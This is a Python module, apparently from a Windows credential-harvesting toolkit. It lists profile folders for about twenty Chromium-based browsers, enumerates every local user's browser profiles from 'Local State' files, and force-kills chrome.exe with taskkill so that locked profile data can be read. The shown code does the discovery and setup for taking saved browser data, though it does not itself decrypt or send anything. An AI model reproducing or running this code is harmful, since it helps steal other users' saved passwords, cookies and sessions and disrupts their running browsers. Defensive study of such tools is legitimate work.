# coding: utf-8

try:
	import os
	import json
	import subprocess
except ImportError:
	pass

from modules.windows.windows_module import WindowsModule
from api import user


CHROME_WINDOWS_NAMES = [
	'7Star\\7Star\\User Data',
	'Amigo\\User Data',
	'BraveSoftware\\Brave-Browser\\User Data',
	'CentBrowser\\User Data',
	'Chedot\\User Data',
	'Google\\Chrome SxS\\User Data',
	'Chromium\\User Data',
	'CocCoc\\Browser\\User Data',
	'Comodo\\Dragon\\User Data',
	'Elements Browser\\User Data',
	'Epic Privacy Browser\\User Data',
	'Google\\Chrome\\User Data',
	'Kometa\\User Data',
	'Opera Software\\Opera Stable',
	'Kometa\\User Data',
	'Orbitum\\User Data',
	'Sputnik\\Sputnik\\User Data',
	'Torch\\User Data',
	'uCozMedia\\Uran\\User Data',
	'Vivaldi\\User Data',
	'Yandex\\YandexBrowser\\User Data',
]
PROFILES = []
PROFILES_CHECK = False
EXECUTE_CHECK = False


class ChromeModule(WindowsModule):

	def __init__(self, name, version, file, dependencies):
		WindowsModule.__init__(
			self,
			name=name,
			version=version,
			file=file,
			dependencies=dependencies+['os', 'json', 'subprocess'],
		)

	def has(self):
		return super().has() and self.get_profiles()

	def execute(self) -> bool:
		global EXECUTE_CHECK

		if not super().execute():
			return False
		if not EXECUTE_CHECK:
			EXECUTE_CHECK = True
			try:
				subprocess.check_output(['taskkill', '/F', '/im', 'chrome.exe'])
			except subprocess.CalledProcessError:
				pass
		return True

	def get_profiles(self) -> list:
		global PROFILES_CHECK, CHROME_WINDOWS_NAMES, PROFILES

		if PROFILES_CHECK:
			return PROFILES
		else:
			PROFILES_CHECK = True
			configs = []
			if os.environ.get('LOCALAPPDATA'):
				localdatas = os.environ.get('LOCALAPPDATA').replace(user.get_username(), '{user}')
			else:
				localdatas = 'C:\\Users\\{user}\\AppData\\Local'
			for localdata in self.get_users_path_to(localdatas):
				for name in CHROME_WINDOWS_NAMES:
					if os.path.isdir(localdata + '\\' + name):
						configs.append(localdata + '\\' + name)

			for config in configs:
				profiles_name = []
				if os.path.isfile(config + '\\Local State'):
					with open(config + '\\Local State') as file:
						local_state_json = json.load(file)

					if local_state_json and 'profile' in local_state_json and 'info_cache' in local_state_json['profile']:
							profiles_name += local_state_json['profile']['info_cache'].keys()
				else:
					profiles_name.append('Default')

				for name in profiles_name:
					path = config + '\\' + name
					if os.path.isdir(path):
						PROFILES.append(path)
		return PROFILES
